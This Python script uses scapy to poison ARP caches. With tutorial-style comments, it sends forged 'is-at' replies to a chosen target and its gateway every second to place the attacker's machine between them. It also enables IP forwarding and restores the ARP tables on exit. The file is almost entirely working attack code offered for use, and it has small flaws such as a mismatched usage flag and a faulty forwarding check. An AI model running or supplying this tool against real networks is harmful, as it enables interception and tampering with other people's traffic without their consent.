"""
srp return a tuple of two lists. The first element is a list of tuples (packet sent, answer),
and the second element is the list of unanswered packets. These two elements are lists,
but they are wrapped by an object to present them better, and to provide them with some methods
that do most frequently needed actions

For e.g.,

answered , unanswered = srp()

1. answered is a list of two tuples (sent packets and received packets)
2. unanswered is a list of unanswered packets

So,
answered = [(sent1,received1), (sent2,received2), (sent3,received3), ...]
unanswered = [unanswered1 ,unanswered2, unanswered3, ...]

output of srp() == ([answered],[unanswered])

"""
import time
from scapy import *
from scapy.layers.l2 import ARP,Ether
from scapy.sendrecv import srp,send
import argparse
import os
# import winreg


# for enabling ip forwarding so that our device can act as proxy without any problems due to sync between ip and mac address
# so the code given below changes the content of file if it is 0 it will change to 1 of will simply do nothing
def enable_ip_route_for_linux():
    file_path = '/proc/sys/net/ipv4/ip_forward'
    with open(file_path , 'w+') as file:   #for openening the file with read+write mode
        if file.read == 1:
            pass
        else:
            file.write('1')

# def enable_ip_route_for_windows():
#     try:
#         key_path = r'SYSTEM\CurrentControlSet\Services\Tcpip\Parameters'
#         with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE) as key:
#             # Enable IP forwarding by setting IPEnableRouter to 1
#             winreg.SetValueEx(key, 'IPEnableRouter', 0, winreg.REG_DWORD, 1)
#         print("IP forwarding enabled successfully.")
#     except Exception as e:
#         print("Error:", e)

"""
for file handling : Here's what each part does:

    winreg.OpenKey: This function is used to open a key in the Windows Registry.
    winreg.HKEY_LOCAL_MACHINE: This specifies the root key to open. In this case, it's HKEY_LOCAL_MACHINE.
    key_path: This is the path to the key relative to the root key specified earlier.
    0: This argument specifies the access rights. 0 means it's opened for reading.
    winreg.KEY_WRITE: This flag indicates that the key should be opened with write access.
    as key: This assigns the opened key to the variable key.
"""


# to get the mac of target

def get_mac(ip):
    answered , unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip),verbose=0)
    if answered:
        return answered[0][1].src     #answered = [[0]-->(sent1,[1]--->received1)].header source recieved

def spoof(target_ip,host_ip):
    target_mac = get_mac(target_ip)  # we will refer router as target so here we will get router mac and store it in target_mac

    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip,
                       op='is-at')  # here we are creating forged arp response packet

    """ 
    we are creating response packet even if not requested so that we can tell that our mac is of hosts mac so we set pdst or simply
    destination ip to  to routers ip and destination mac i.e is hwdst to routers mac that we got from get mac function and stored in 
    target_mac. here op field just defines your sending answer and the is-at mentioned here comes in response for e.g this ip is at ...
    """
    # now we will send the response
    send(arp_response, verbose=0)

    # thus now we have to know status
    """
    to know self mac, if we generate  a arp packet and dont provide values scapy by default takes some value,,so here if we need our own mac
    then we have to check hardware source in arp packet that will be provided by default by scapy..
    """
    self_mac = ARP().hwsrc  # This will set self_mac variable to our own mac
    print("[+] send to  {}: {} is-at {}".format(target_ip, host_ip, self_mac))

    # till this point we have said to target that we are gateway or router, now similarly we have to say gateway that we are target or host so
    # here we dont have to define other function we just need to change our understanding our target is our host and host is our router
    # here we have poisoned the arp as well as gateway table now we need to restore so that if we end the attack the victim should get legitimate
    # connection


def restore(target_ip,host_ip):
    target_mac = get_mac(target_ip)  # now we will set host mac to host ip

    host_mac = get_mac(host_ip)

    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    # here we are telling router that routers the clients/hosts ip and host mac by removing op attribute and is-at thing
    # here simply we have set packet like ip source to host ip and hardware source to host mac and ip destination to router ip and mac destination
    # to router mac

    send(arp_response, verbose=0, count=5)

    print("[+] send to  {}: {} is-at {}".format(target_ip, host_ip, host_mac))   # and lastly printing the restored status
"""
now we need to call spoof function infinite times so that victim does not get interrupted and restores again if we have to close attack the minimum
number of restore packets  sent is defined in count here which is 5
restore and spoof both should be called at least 2 times 
"""





argparse = argparse.ArgumentParser(description="This is arp spoofer", usage="python3 arp_spoofer.py -t target_ip -h gateway_ip ")
argparse.add_argument("-t", "--target", help="Enter the target to poison ", required=True)
argparse.add_argument("-g", "--gateway", help="Enter the gateway to poison  ", required=True)
args = argparse.parse_args()
target_ip = args.target
host_ip = args.gateway

if os.name == 'posix':
    enable_ip_route_for_linux()

# if os.name == 'nt':
#     enable_ip_route_for_windows()

try:
    while(True):
        spoof(target_ip,host_ip)
        spoof(host_ip,target_ip)
        time.sleep(1)
except KeyboardInterrupt:
    print("[!] Detected CTRL+C, restoring the network...")
    restore(target_ip, host_ip)
    restore(host_ip, target_ip)



